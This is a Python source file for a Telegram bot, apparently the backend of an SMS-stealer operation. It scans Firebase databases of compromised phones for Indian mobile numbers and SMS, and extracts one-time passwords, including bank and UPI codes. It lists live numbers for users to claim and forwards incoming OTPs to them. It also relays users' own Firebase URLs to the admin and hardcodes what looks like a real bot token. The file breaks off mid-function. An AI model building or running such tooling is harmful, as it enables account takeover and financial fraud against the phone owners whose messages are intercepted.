#!/usr/bin/env python3
"""
OTP Forwarding Bot - Premium Multi-System v6.0

v6.0 changes (BACKEND + UX overhaul):
- PANEL SELECTION. Users now pick which panel (system) to use from a premium
  inline menu. Only panels they are allowed to see are listed (public panels +
  their own private firebase panels).
- INLINE ONLINE NUMBERS. After choosing a panel, every ONLINE number of that
  panel is shown as an inline button. A Next button paginates and a Refresh
  button re-scans that single panel on demand.
- USER "SET FIREBASE". A user can attach their OWN firebase. The bot scans ONLY
  that firebase and shows ITS numbers (never the existing panels'). The firebase
  is forwarded to the admin chat WITH A CLICKABLE LINK.
- SINGLE "ADMIN PANEL" BUTTON. All admin controls now live inside one premium
  inline hub instead of a wall of reply buttons.
- ACTIVE NUMBERS SCANNER. The bot continuously scans numbers across ALL panels.
  Numbers that receive more OTPs are automatically promoted to SPECIAL NUMBERS
  and kept fresh with their most recent OTP.
- PREMIUM DESIGN. Branded headers, tree-style stat blocks, blockquote details,
  step badges, relative timestamps and polished HTML everywhere.

v5.0 baseline (unchanged logic):
- INITIAL SMS SCAN REMOVED. The bot starts instantly. Each device is lazily
  seeded on its first poll (old SMS are marked seen, never forwarded).
- TIME-BASED USER ACCESS. Admin approves users and sets how long they can use
  the bot. Access auto-expires and is enforced everywhere.
- SEPARATE SYSTEM PER FIREBASE. Every Firebase URL becomes its own isolated
  system with its own devices, numbers and OTP service.
- SMS HISTORY. Every SMS is recorded and viewable (per system / per number).
"""

import re, time, asyncio, logging, json, os, hashlib, html
from typing import Optional, Dict, List, Set, Tuple
from collections import deque
from datetime import datetime
import aiohttp
from telegram import (Update, ReplyKeyboardMarkup, KeyboardButton,
                      InlineKeyboardMarkup, InlineKeyboardButton)
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters, ContextTypes)
from databases import DATABASES

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
logger = logging.getLogger("OTPFwd")

# ── CONFIG ──────────────────────────────────────────────────────────────────
# Railway-friendly config: read from environment variables when present.
# Set BOT_TOKEN and (optionally) ADMIN_ID in Railway -> Variables.
ADMIN_ID = int(os.environ.get("ADMIN_ID", "6582969543"))
TOKEN = os.environ.get("BOT_TOKEN", "8597129727:AAHZ6l73aLE_Dke3CedFkn57odm8Nu7Ua70")
# Railway gives a web service a PORT; we open a tiny health endpoint on it so the
# service is never marked unhealthy/restarted (which kills polling + inline buttons).
HEALTH_PORT = int(os.environ.get("PORT", "8080"))
FB_TIMEOUT = 20
POLL_INTERVAL = 0.5
MAX_CONCURRENT_POLL = 40
MAX_CONCURRENT_DB = 20
SMS_SEEN_MAX = 300000
AUTO_TIMEOUT = 300
HOT_WINDOW = 300
OTP_DEDUP_WINDOW = 600
OTP_DEDUP_MAX = 200000
FIREBASE_STORE = "firebase_urls.json"
USER_FB_STORE = "user_firebases.json"
ACCESS_STORE = "access.json"
HISTORY_MAX = 3000

# Pagination / special-number tuning
NUMBERS_PER_PAGE = 8
PANELS_PER_PAGE = 6
SPECIAL_RECENT_MIN = 2      # >= this many OTPs in HOT_WINDOW -> special
SPECIAL_TOTAL_MIN = 3       # or >= this many OTPs all-time -> special
SPECIAL_TTL = 3600          # drop a special number after this idle time

# ── PREMIUM DESIGN SYSTEM ───────────────────────────────────────────────────
APP_NAME = "OTP FORWARD"
TAGLINE = "Premium Multi-System Control"

DIV = "━" * 26
DIV_THIN = "┄" * 28

# Status glyphs
G_OK, G_ERR, G_WARN, G_INFO = "✅", "❌", "⚠️", "ℹ️"

def esc(s) -> str:
    return html.escape(str(s))

def fmt_phone(num) -> str:
    """Format an Indian mobile number as +91XXXXXXXXXX (no spaces, NO emoji).
    The 🟢 marker is added OUTSIDE any <code> block so it is never copied."""
    n = re.sub(r"\D", "", str(num))
    if len(n) >= 10:
        n = n[-10:]
    return f"+91{n}" if n else "—"

def ago(ts) -> str:
    """Relative timestamp: 'just now', '3m ago', '2h ago'."""
    if not ts:
        return "—"
    secs = int(max(0, time.time() - ts))
    if secs < 5:
        return "just now"
    if secs < 60:
        return f"{secs}s ago"
    if secs < 3600:
        return f"{secs // 60}m ago"
    if secs < 86400:
        return f"{secs // 3600}h ago"
    return f"{secs // 86400}d ago"

def brand(subtitle: str = "") -> str:
    """Premium branded header used at the top of every screen."""
    head = f"🤖 <b>{APP_NAME}</b>"
    if subtitle:
        head += f"\n<i>{subtitle}</i>"
    return head + f"\n{DIV}"

def title(emoji: str, text: str) -> str:
    """Section title line, e.g. '📊  DASHBOARD'."""
    return f"{emoji} <b>{text}</b>"

def kv(label: str, value: str, last: bool = False) -> str:
    """A tree-style key/value row for premium stat blocks."""
    branch = "└" if last else "├"
    return f"  {branch} {label} · <b>{value}</b>"

def note(text: str) -> str:
    """A subtle quoted hint line."""
    return f"<blockquote>{text}</blockquote>"

def step_badge(step: int, total: int) -> str:
    """Progress badge for multi-step flows."""
    filled = "●" * step + "○" * (total - step)
    return f"<code>{filled}</code>  Step {step}/{total}"

# ── DATA STRUCTURES ─────────────────────────────────────────────────────────
class DeviceInfo:
    __slots__ = ['dev_id', 'numbers', 'status', 'base_url', 'db_tag',
                 'sms_paths', 'keys', 'last_sms_hash', 'last_poll_time', 'poll_count',
                 'seeded']
    def __init__(self, dev_id, numbers, status, base_url, db_tag, sms_paths, keys):
        self.dev_id = dev_id
        self.numbers = numbers
        self.status = status
        self.base_url = base_url
        self.db_tag = db_tag
        self.sms_paths = sms_paths
        self.keys = keys
        self.last_sms_hash = None
        self.last_poll_time = 0
        self.poll_count = 0
        self.seeded = False

class NumberProfile:
    """Tracks OTP activity for a single number (no scoring)."""
    __slots__ = ['number', 'total_otps', 'last_otp_time', 'last_otp_code',
                 'last_otp_sender', 'otp_history', 'assigned_to']
    def __init__(self, number: str):
        self.number = number
        self.total_otps = 0
        self.last_otp_time = 0.0
        self.last_otp_code = ""
        self.last_otp_sender = ""
        self.otp_history: deque = deque(maxlen=50)
        self.assigned_to: Optional[int] = None

    def record_otp(self, code: str, sender: str = "") -> bool:
        """Record an OTP. Returns True if genuinely new (number,code) pair."""
        if not otp_code_seen(self.number, code):
            return False
        now = time.time()
        self.total_otps += 1
        self.last_otp_code = code
        self.last_otp_sender = sender
        self.last_otp_time = now
        self.otp_history.append(now)
        return True

    @property
    def seconds_since_last_otp(self) -> float:
        if self.last_otp_time == 0:
            return 999999
        return time.time() - self.last_otp_time

    @property
    def recent_otp_count(self) -> int:
        now = time.time()
        return sum(1 for t in self.otp_history if now - t < HOT_WINDOW)

    @property
    def live_status_emoji(self) -> str:
        if self.last_otp_time == 0:
            return "\U0001F480"
        secs = time.time() - self.last_otp_time
        if secs < 60:
            return "\U0001F525"
        elif secs < 300:
            return "\U0001F7E2"
        elif secs < 900:
            return "\U0001F7E1"
        elif secs < 3600:
            return "\U0001F7E0"
        else:
            return "\U0001F480"

class System:
    """One isolated Firebase system: its own devices, numbers and service.
    `owner` is None for public/admin panels, or a user id for private panels."""
    __slots__ = ['sid', 'name', 'url', 'keys', 'devices', 'numbers', 'stats', 'owner']
    def __init__(self, sid, name, url, keys, owner=None):
        self.sid = sid
        self.name = name
        self.url = url
        self.keys = keys
        self.owner = owner
        self.devices: List[DeviceInfo] = []
        self.numbers: Dict[str, NumberProfile] = {}
        self.stats = {"devices": 0, "online": 0, "numbers": 0}

# ── GLOBAL STATE ────────────────────────────────────────────────────────────
SYSTEMS: Dict[str, System] = {}
USER_WAITING: Dict[int, Tuple[str, str]] = {}   # uid -> (sid, number)
USER_WAIT_TIME: Dict[int, float] = {}

# ── ADMIN SPECIAL SYSTEM: watch up to 5 numbers at once ──
ADMIN_WATCH_MAX = 5
ADMIN_WATCH: Dict[int, List[Tuple[str, str]]] = {}      # admin uid -> [(sid, num), ...] ACTIVE
ADMIN_WATCH_SEL: Dict[int, List[Tuple[str, str]]] = {}  # admin uid -> [(sid, num), ...] being selected
SEEN_SMS: Set[str] = set()
_seen_sms_list: List[str] = []
_seen_sms_max = SMS_SEEN_MAX

# SMS history (global, capped)
_sms_history: deque = deque(maxlen=HISTORY_MAX)

# Special numbers: key "sid|num" -> {sid, num, name, total, recent, last_code,
#                                   last_sender, last_time}
_special_numbers: Dict[str, dict] = {}

# Last panel each user browsed (for My Status / history defaults)
_user_panel: Dict[int, str] = {}

# ── OTP CODE DEDUP ──────────────────────────────────────────────────────────
_OTP_CODE_SEEN: Dict[Tuple[str, str], float] = {}

def otp_code_seen(number: str, code: str) -> bool:
    key = (number, code)
    now = time.time()
    if key in _OTP_CODE_SEEN:
        if now - _OTP_CODE_SEEN[key] < OTP_DEDUP_WINDOW:
            return False
    _OTP_CODE_SEEN[key] = now
    if len(_OTP_CODE_SEEN) > OTP_DEDUP_MAX:
        cutoff = now - OTP_DEDUP_WINDOW
        for k in [k for k, v in _OTP_CODE_SEEN.items() if v < cutoff]:
            del _OTP_CODE_SEEN[k]
    return True

_session: Optional[aiohttp.ClientSession] = None
_app: Optional[Application] = None
_scan_done = False
_scan_running = False
_user_list: Dict[int, list] = {}
_user_page: Dict[int, int] = {}

# ── ACCESS MANAGEMENT ───────────────────────────────────────────────────────
# uid -> {"expires": ts (0 = never), "system": sid, "name": str}
_access: Dict[int, Dict] = {}
# uid -> {"name": str, "ts": ts}
_pending: Dict[int, Dict] = {}

def load_access():
    global _access, _pending
    try:
        if os.path.exists(ACCESS_STORE):
            with open(ACCESS_STORE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                _access = {int(k): v for k, v in data.get("access", {}).items()}
                _pending = {int(k): v for k, v in data.get("pending", {}).items()}
                logger.info(f"Loaded {len(_access)} access entries, {len(_pending)} pending")
    except Exception as e:
        logger.warning(f"Could not load {ACCESS_STORE}: {e}")

def save_access():
    try:
        with open(ACCESS_STORE, "w", encoding="utf-8") as f:
            json.dump({"access": {str(k): v for k, v in _access.items()},
                       "pending": {str(k): v for k, v in _pending.items()}}, f, indent=2)
    except Exception as e:
        logger.warning(f"Could not save {ACCESS_STORE}: {e}")

def is_authorized(uid: int) -> bool:
    if uid == ADMIN_ID:
        return True
    entry = _access.get(uid)
    if not entry:
        return False
    exp = entry.get("expires", 0)
    if exp and exp < time.time():
        return False
    return True

def access_remaining(uid: int) -> Optional[float]:
    if uid == ADMIN_ID:
        return None  # unlimited
    entry = _access.get(uid)
    if not entry:
        return 0
    exp = entry.get("expires", 0)
    if not exp:
        return None
    return max(0, exp - time.time())

def parse_duration(text: str) -> Optional[int]:
    """Parse '2d', '12h', '30m', '1w', '90' (default days) -> seconds."""
    if not text:
        return None
    text = text.strip().lower()
    m = re.fullmatch(r"(\d+)\s*([smhdw]?)", text)
    if not m:
        return None
    n = int(m.group(1))
    unit = m.group(2) or "d"
    mult = {"s": 1, "m": 60, "h": 3600, "d": 86400, "w": 604800}[unit]
    return n * mult

def fmt_duration(secs: float) -> str:
    if secs is None:
        return "∞ unlimited"
    secs = int(secs)
    if secs <= 0:
        return "expired"
    d, secs = divmod(secs, 86400)
    h, secs = divmod(secs, 3600)
    m, s = divmod(secs, 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    if not parts: parts.append(f"{s}s")
    return " ".join(parts)

# ── FIREBASE URL MANAGEMENT ─────────────────────────────────────────────────
_firebase_urls: List[Dict] = []       # admin-added public firebases
_user_firebases: List[Dict] = []      # user-added private firebases
_admin_state: Dict[int, str] = {}
_admin_data: Dict[int, dict] = {}
_user_state: Dict[int, str] = {}
_user_data: Dict[int, dict] = {}

def load_firebase_urls():
    global _firebase_urls, _user_firebases
    try:
        if os.path.exists(FIREBASE_STORE):
            with open(FIREBASE_STORE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                _firebase_urls = [d for d in data if isinstance(d, dict) and d.get("url")]
                logger.info(f"Loaded {len(_firebase_urls)} saved Firebase URL(s)")
    except Exception as e:
        logger.warning(f"Could not load {FIREBASE_STORE}: {e}")
    try:
        if os.path.exists(USER_FB_STORE):
            with open(USER_FB_STORE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                _user_firebases = [d for d in data
                                   if isinstance(d, dict) and d.get("url") and d.get("sid")]
                logger.info(f"Loaded {len(_user_firebases)} user Firebase(s)")
    except Exception as e:
        logger.warning(f"Could not load {USER_FB_STORE}: {e}")

def save_firebase_urls():
    try:
        with open(FIREBASE_STORE, "w", encoding="utf-8") as f:
            json.dump(_firebase_urls, f, indent=2)
    except Exception as e:
        logger.warning(f"Could not save {FIREBASE_STORE}: {e}")

def save_user_firebases():
    try:
        with open(USER_FB_STORE, "w", encoding="utf-8") as f:
            json.dump(_user_firebases, f, indent=2)
    except Exception as e:
        logger.warning(f"Could not save {USER_FB_STORE}: {e}")

def parse_firebase_url(raw: str) -> Optional[str]:
    if not raw:
        return None
    raw = raw.strip()
    if not raw.lower().startswith("http"):
        raw = "https://" + raw
    raw = raw.rstrip("/")
    if raw.endswith(".json"):
        raw = raw[:-5]
    if "." not in raw.split("//", 1)[-1]:
        return None
    return raw

def build_systems():
    """Rebuild SYSTEMS from built-in DATABASES + admin Firebase URLs +
    user private firebases (with ownership)."""
    global SYSTEMS
    merged: Dict[str, Dict] = {}
    for tag, cfg in DATABASES.items():
        merged[tag] = {"name": tag, "url": cfg["url"], "keys": cfg.get("keys", []) or [],
                       "owner": None}
    for i, entry in enumerate(_firebase_urls):
        sid = f"custom_{i+1}"
        merged[sid] = {"name": entry.get("name") or f"System {i+1}",
                       "url": entry["url"], "keys": entry.get("keys", []) or [],
                       "owner": None}
    for entry in _user_firebases:
        sid = entry.get("sid")
        if not sid:
            continue
        merged[sid] = {"name": entry.get("name") or "My Firebase",
                       "url": entry["url"], "keys": entry.get("keys", []) or [],
                       "owner": entry.get("uid")}
    new_systems: Dict[str, System] = {}
    for sid, cfg in merged.items():
        if sid in SYSTEMS:
            s = SYSTEMS[sid]
            s.name = cfg["name"]; s.url = cfg["url"]; s.keys = cfg["keys"]; s.owner = cfg["owner"]
            new_systems[sid] = s
        else:
            new_systems[sid] = System(sid, cfg["name"], cfg["url"], cfg["keys"], owner=cfg["owner"])
    SYSTEMS = new_systems

def system_list() -> List[System]:
    return list(SYSTEMS.values())

def system_by_index(i: int) -> Optional[System]:
    lst = system_list()
    if 0 <= i < len(lst):
        return lst[i]
    return None

def visible_panels(uid: int) -> List[System]:
    """Panels a user may browse: public panels (owner None) + their own panels.
    Admin sees everything."""
    if uid == ADMIN_ID:
        return system_list()
    return [s for s in system_list() if s.owner is None or s.owner == uid]

def best_system_with_numbers() -> Optional[System]:
    """Return the system with the most free numbers."""
    best = None
    best_free = -1
    for s in system_list():
        free = sum(1 for p in s.numbers.values() if p.assigned_to is None)
        if free > best_free:
            best_free = free
            best = s
    if best is not None and best_free > 0:
        return best
    for s in system_list():
        if s.numbers:
            return s
    return best

def get_user_system(uid: int) -> Optional[System]:
    """The panel a user is 'on' for status/history defaults."""
    sid = _user_panel.get(uid)
    if sid and sid in SYSTEMS:
        return SYSTEMS[sid]
    entry = _access.get(uid)
    if entry and entry.get("system") in SYSTEMS:
        return SYSTEMS[entry["system"]]
    panels = visible_panels(uid)
    if panels:
        fallback = best_system_with_numbers()
        if fallback is not None and fallback.numbers and fallback in panels:
            return fallback
        return panels[0]
    return None

def seen_add(sid: str):
    if sid not in SEEN_SMS:
        SEEN_SMS.add(sid)
        _seen_sms_list.append(sid)
        if len(_seen_sms_list) > _seen_sms_max:
            old = _seen_sms_list[:_seen_sms_max // 2]
            for o in old:
                SEEN_SMS.discard(o)
            del _seen_sms_list[:_seen_sms_max // 2]

def add_sms_history(sid, num, sender, body, otp):
    _sms_history.append({"ts": time.time(), "sid": sid, "num": num,
                         "sender": sender, "body": body, "otp": otp})

# ── SPECIAL NUMBERS (active-number scanner) ─────────────────────────────────
def maybe_mark_special(sid: str, num: str):
    """Promote a number to SPECIAL if it is receiving a lot of OTPs.
    Kept fresh with the most recent OTP on every call."""
    s = SYSTEMS.get(sid)
    if not s or num not in s.numbers:
        return
    prof = s.numbers[num]
    recent = prof.recent_otp_count
    total = prof.total_otps
    if recent >= SPECIAL_RECENT_MIN or total >= SPECIAL_TOTAL_MIN:
        key = f"{sid}|{num}"
        _special_numbers[key] = {
            "sid": sid, "num": num, "name": s.name,
            "total": total, "recent": recent,
            "last_code": prof.last_otp_code,
            "last_sender": prof.last_otp_sender,
            "last_time": prof.last_otp_time or time.time(),
        }

def prune_special():
    """Drop special numbers that have gone quiet."""
    now = time.time()
    for k in list(_special_numbers.keys()):
        e = _special_numbers[k]
        if now - e.get("last_time", 0) > SPECIAL_TTL:
            del _special_numbers[k]

def special_sorted() -> List[dict]:
    return sorted(_special_numbers.values(),
                  key=lambda x: (x.get("recent", 0), x.get("total", 0)), reverse=True)

# ── SSL / SESSION ───────────────────────────────────────────────────────────
async def get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=300, keepalive_timeout=30)
        )
    return _session

# ── FIREBASE GET ────────────────────────────────────────────────────────────
async def fb_get(path: str, base: str, keys: list, retries: int = 2) -> Optional[dict]:
    s = await get_session()
    urls = []
    if not keys:
        urls.append(f"{base}/{path}.json" if path else f"{base}/.json")
    else:
        for k in keys:
            urls.append(f"{base}/{path}.json?auth={k}" if path else f"{base}/.json?auth={k}")
    for attempt in range(retries):
        for url in urls:
            try:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=FB_TIMEOUT)) as r:
                    if r.status == 200:
                        data = await r.json(content_type=None)
                        return data if isinstance(data, dict) else None
                    elif r.status == 401:
                        continue
                    elif r.status == 404:
                        return None
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass
            except Exception:
                pass
        if attempt < retries - 1:
            await asyncio.sleep(0.2 * (attempt + 1))
    return None

# ── EXTRACTION ──────────────────────────────────────────────────────────────
KEYS_CHECK = ["sim1Number", "sim2Number", "numberSim1", "numberSim2",
              "mobNo", "phoneNumber", "phone", "mobile"]

def extract_nums(*dicts) -> List[str]:
    nums = []
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in KEYS_CHECK:
            v = str(d.get(k, ""))
            c = re.sub(r"\D", "", v)
            if len(c) >= 10:
                nums.append(c[-10:])
    return list(set(nums))

def sms_paths_for(did: str) -> List[str]:
    """Candidate SMS/OTP storage paths. Panels differ:
       - most panels  -> user_sms/{did}
       - kammarene    -> messages/{did}
       - legacy       -> All_Users/sms/{did}
    Poll all of them; non-existent paths simply return nothing."""
    return [f"user_sms/{did}", f"messages/{did}", f"All_Users/sms/{did}"]

def extract_otp(body: str) -> Optional[str]:
    kw_match = re.search(
        r"(?:otp|verif(?:ication|y)?|code|pin|passcode|token|one.time|secret)"
        r"[^\d]{0,20}(\d{4,8})\b", body, re.I)
    if kw_match:
        return kw_match.group(1)
    branded_match = re.search(
        r"(?:whatsapp|google|facebook|fb|amazon|flipkart|instagram|twitter|telegram"
        r"|bank|paytm|phonepe|gpay|upi|sbm|hdfc|icici|axis|sbi|pnb|bob)"
        r"[^\d]{0,30}(\d{4,6})\b", body, re.I)
    if branded_match:
        return branded_match.group(1)
    if len(body) > 200:
        return None
    fallback = re.search(r"(?<!\d)(\d{4,6})(?!\d)", body)
    if fallback:
        code = fallback.group(1)
        try:
            val = int(code)
            if 1900 <= val <= 2099:
                return None
            if val % 1000 == 0 or val % 500 == 0:
                return None
            if val < 1300 and len(code) == 4:
                return None
        except Exception:
            pass
        return code
    return None

# ── ADMIN NOTIFY ────────────────────────────────────────────────────────────
async def send_admin(text: str):
    if _app:
        try:
            await _app.bot.send_message(ADMIN_ID, text[:4000], parse_mode="HTML",
                                        disable_web_page_preview=True)
        except Exception:
            pass

# ── KEYBOARD BUILDERS (reply) ───────────────────────────────────────────────
# Professional, consistent control labels (emoji + clear verb)
BTN_GET = "🔥 Get Number"
BTN_MY = "📊 My Status"
BTN_HISTORY = "📜 History"
BTN_SPECIAL = "⭐ Special Numbers"
BTN_SETFB = "➕ Set Firebase"
BTN_ADMINPANEL = "🛠 Admin Panel"
BTN_WATCH5 = "🎯 Watch 5 Numbers"
BTN_CANCEL = "✖️ Cancel"
BTN_MENU = "🏠 Main Menu"
BTN_STOP = "⏹ Stop"
BTN_NEWNUM = "🔄 New Number"
BTN_REQ = "🔓 Request Access"
BTN_PREV = "◀️ Prev"
BTN_NEXT = "▶️ Next"

def _kb(rows, placeholder="Choose an option"):
    return ReplyKeyboardMarkup(rows, resize_keyboard=True, is_persistent=True,
                               input_field_placeholder=placeholder)

def main_keyboard(is_admin=False):
    if is_admin:
        rows = [
            [KeyboardButton(BTN_GET), KeyboardButton(BTN_MY)],
            [KeyboardButton(BTN_HISTORY), KeyboardButton(BTN_SPECIAL)],
            [KeyboardButton(BTN_WATCH5)],
            [KeyboardButton(BTN_SETFB)],
            [KeyboardButton(BTN_ADMINPANEL)],
        ]
    else:
        rows = [
            [KeyboardButton(BTN_GET), KeyboardButton(BTN_SETFB)],
            [KeyboardButton(BTN_MY), KeyboardButton(BTN_HISTORY)],
            [KeyboardButton(BTN_SPECIAL)],
        ]
    return _kb(rows, "Select an action")

def back_keyboard():
    return _kb([[KeyboardButton(BTN_MENU)]], "Tap to return")

def waiting_keyboard():
    return _kb([[KeyboardButton(BTN_MY), KeyboardButton(BTN_CANCEL)],
                [KeyboardButton(BTN_MENU)]], "Watching for OTP…")

def otp_received_keyboard():
    return _kb([[KeyboardButton(BTN_NEWNUM), KeyboardButton(BTN_STOP)],
                [KeyboardButton(BTN_MENU)]], "OTP delivered")

def request_keyboard():
    return _kb([[KeyboardButton(BTN_REQ)]], "Request access to continue")

# ── KEYBOARD BUILDERS (inline) ──────────────────────────────────────────────
def panels_inline(uid: int, page: int = 0) -> InlineKeyboardMarkup:
    panels = visible_panels(uid)
    rows = []
    total = len(panels)
    start = page * PANELS_PER_PAGE
    end = min(start + PANELS_PER_PAGE, total)
    for s in panels[start:end]:
        free = sum(1 for p in s.numbers.values() if p.assigned_to is None)
        mark = "🟢" if free else ("🟡" if s.numbers else "⚪")
        priv = " · 🔒" if s.owner else ""
        label = f"{mark} {s.name} · {free} free{priv}"
        rows.append([InlineKeyboardButton(label, callback_data=f"panel:{s.sid}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"ppage:{page-1}"))
    nav.append(InlineKeyboardButton("🔄 Refresh", callback_data=f"ppage:{page}"))
    if end < total:
        nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"ppage:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([InlineKeyboardButton("⭐ Special Numbers", callback_data="special:0"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")])
    return InlineKeyboardMarkup(rows)

def numbers_inline(sid: str, page: int = 0) -> InlineKeyboardMarkup:
    s = SYSTEMS.get(sid)
    rows = []
    if not s:
        return InlineKeyboardMarkup([[InlineKeyboardButton("🗂 Panels", callback_data="panels:0")]])
    nums = list(s.numbers.items())
    total = len(nums)
    start = page * NUMBERS_PER_PAGE
    end = min(start + NUMBERS_PER_PAGE, total)
    for num, prof in nums[start:end]:
        label = f"🟢 +91{num}"
        if prof.assigned_to:
            label += " · BUSY"
        rows.append([InlineKeyboardButton(label, callback_data=f"num:{sid}:{num}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"npage:{sid}:{page-1}"))
    nav.append(InlineKeyboardButton("🔄 Refresh", callback_data=f"nref:{sid}:{page}"))
    if end < total:
        nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"npage:{sid}:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([InlineKeyboardButton("🗂 Panels", callback_data="panels:0"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")])
    return InlineKeyboardMarkup(rows)

def special_inline(page: int = 0) -> InlineKeyboardMarkup:
    items = special_sorted()
    rows = []
    total = len(items)
    start = page * NUMBERS_PER_PAGE
    end = min(start + NUMBERS_PER_PAGE, total)
    for e in items[start:end]:
        label = f"🟢 +91{e['num']} · {e.get('recent', 0)} recent"
        rows.append([InlineKeyboardButton(label, callback_data=f"snum:{e['sid']}:{e['num']}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"special:{page-1}"))
    nav.append(InlineKeyboardButton("🔄 Refresh", callback_data=f"special:{page}"))
    if end < total:
        nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"special:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([InlineKeyboardButton("🗂 Panels", callback_data="panels:0"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")])
    return InlineKeyboardMarkup(rows)

def admin_panel_inline() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📈 Dashboard", callback_data="adm:dash"),
         InlineKeyboardButton("🗂 Systems", callback_data="adm:systems")],
        [InlineKeyboardButton("👥 Users", callback_data="adm:users"),
         InlineKeyboardButton("⭐ Special", callback_data="adm:special")],
        [InlineKeyboardButton("✅ Approve", callback_data="adm:approve"),
         InlineKeyboardButton("🚫 Revoke", callback_data="adm:revoke")],
        [InlineKeyboardButton("⏳ Duration", callback_data="adm:setdur"),
         InlineKeyboardButton("🔀 Set System", callback_data="adm:setsys")],
        [InlineKeyboardButton("➕ Add Database", callback_data="adm:addfb"),
         InlineKeyboardButton("🗑 Remove Database", callback_data="adm:rmfb")],
        [InlineKeyboardButton("🔄 Rescan All", callback_data="adm:rescan")],
    ])

# ── ADMIN "WATCH 5" UI ────────────────────────────────────────────────────────
def watch5_text(sid: Optional[str] = None) -> str:
    sel = ADMIN_WATCH_SEL.get(ADMIN_ID, [])
    active = ADMIN_WATCH.get(ADMIN_ID, [])
    lines = [title("🎯", "ADMIN WATCH — 5 NUMBERS"), DIV,
             note("Select up to 5 numbers. When an OTP arrives on ANY of them, "
                  "it is forwarded to you here automatically."),
             ""]
    if active:
        lines.append("<b>🟢 Currently Watching:</b>")
        for i, (ss, n) in enumerate(active, 1):
            nm = SYSTEMS[ss].name if ss in SYSTEMS else ss
            lines.append(f"  {i}. 🟢 <code>{fmt_phone(n)}</code> · <i>{esc(nm)}</i>")
        lines.append("")
    lines.append("<b>Selected for watch:</b>")
    if sel:
        for i, (ss, n) in enumerate(sel, 1):
            nm = SYSTEMS[ss].name if ss in SYSTEMS else ss
            lines.append(f"  {i}. 🟢 <code>{fmt_phone(n)}</code> · <i>{esc(nm)}</i>")
    else:
        lines.append("  <i>None yet — open a panel below and tap numbers.</i>")
    lines.append("")
    lines.append(f"<b>{len(sel)}/{ADMIN_WATCH_MAX} selected</b>")
    if sid and sid in SYSTEMS:
        lines.append(f"\n<i>Browsing: {esc(SYSTEMS[sid].name)}</i>")
    return "\n".join(lines)

def watch5_panels_inline(page: int = 0) -> InlineKeyboardMarkup:
    panels = system_list()
    rows = []
    total = len(panels)
    start = page * PANELS_PER_PAGE
    end = min(start + PANELS_PER_PAGE, total)
    for s in panels[start:end]:
        free = sum(1 for p in s.numbers.values() if p.assigned_to is None)
        label = f"🟢 {s.name} · {free} free"
        rows.append([InlineKeyboardButton(label, callback_data=f"w5:panel:{s.sid}:0")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"w5:p:{page-1}"))
    if end < total:
        nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"w5:p:{page+1}"))
    if nav:
        rows.append(nav)
    sel = ADMIN_WATCH_SEL.get(ADMIN_ID, [])
    rows.append([InlineKeyboardButton(f"▶️ Start Watching ({len(sel)}/{ADMIN_WATCH_MAX})",
                                      callback_data="w5:start")])
    rows.append([InlineKeyboardButton("🧹 Clear", callback_data="w5:clear"),
                 InlineKeyboardButton("🛑 Stop", callback_data="w5:stop")])
    rows.append([InlineKeyboardButton("🏠 Menu", callback_data="menu")])
    return InlineKeyboardMarkup(rows)

def watch5_numbers_inline(sid: str, page: int = 0) -> InlineKeyboardMarkup:
    s = SYSTEMS.get(sid)
    rows = []
    if not s:
        return InlineKeyboardMarkup([[InlineKeyboardButton("🗂 Panels", callback_data="w5:p:0")]])
    sel = ADMIN_WATCH_SEL.get(ADMIN_ID, [])
    nums = list(s.numbers.items())
    total = len(nums)
    start = page * NUMBERS_PER_PAGE
    end = min(start + NUMBERS_PER_PAGE, total)
    for num, prof in nums[start:end]:
        chosen = any(ss == sid and n == num for ss, n in sel)
        mark = "✅" if chosen else "🟢"
        label = f"{mark} +91{num}"
        if prof.assigned_to:
            label += " · BUSY"
        rows.append([InlineKeyboardButton(label, callback_data=f"w5:n:{sid}:{page}:{num}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"w5:np:{sid}:{page-1}"))
    nav.append(InlineKeyboardButton("🔄 Refresh", callback_data=f"w5:np:{sid}:{page}"))
    if end < total:
        nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"w5:np:{sid}:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([InlineKeyboardButton(f"▶️ Start Watching ({len(sel)}/{ADMIN_WATCH_MAX})",
                                      callback_data="w5:start")])
    rows.append([InlineKeyboardButton("🧹 Clear", callback_data="w5:clear"),
                 InlineKeyboardButton("🗂 Panels", callback_data="w5:p:0")])
    rows.append([InlineKeyboardButton("🏠 Menu", callback_data="menu")])
    return InlineKeyboardMarkup(rows)

# ── SYSTEM SCANNER ──────────────────────────────────────────────────────────
def _is_online(v) -> bool:
    """Normalize online status across schemas (True / 'online' / 'true' / 1)."""
    if v is None:
        return False
    if v is True:
        return True
    return str(v).strip().lower() in ("online", "true", "1", "yes", "active")


async def scan_one_system(system: System) -> System:
